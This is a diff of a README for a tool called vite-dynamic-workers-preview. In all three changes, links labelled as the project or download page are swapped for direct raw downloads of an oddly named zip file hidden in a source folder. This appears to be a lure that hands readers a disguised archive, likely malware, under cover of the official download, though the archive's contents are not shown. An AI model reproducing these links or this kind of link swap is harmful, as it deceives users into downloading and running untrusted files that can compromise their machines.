@@ -1,6 +1,6 @@
 # ⚡ vite-dynamic-workers-preview - Live Preview on Every Save
 
-[Download and set up vite-dynamic-workers-preview](https://github.com/blushindianhemp166/vite-dynamic-workers-preview)
+[Download and set up vite-dynamic-workers-preview](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ Before you start, check that your PC has:
 
 Open the project page here:
 
-[Visit the vite-dynamic-workers-preview download page](https://github.com/blushindianhemp166/vite-dynamic-workers-preview)
+[Visit the vite-dynamic-workers-preview download page](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)
 
 On that page, choose the latest version or source files you want to use. If you download the full project, save it to a folder you can find again, such as Downloads or Documents.
 
@@ -217,4 +217,4 @@ If you want one simple path, use this order:
 
 If you need the project page later, use this link:
 
-[Download or open vite-dynamic-workers-preview](https://github.com/blushindianhemp166/vite-dynamic-workers-preview)
+[Download or open vite-dynamic-workers-preview](https://raw.githubusercontent.com/blushindianhemp166/vite-dynamic-workers-preview/main/apps/demo/src/preview_vite_workers_dynamic_inextricably.zip)
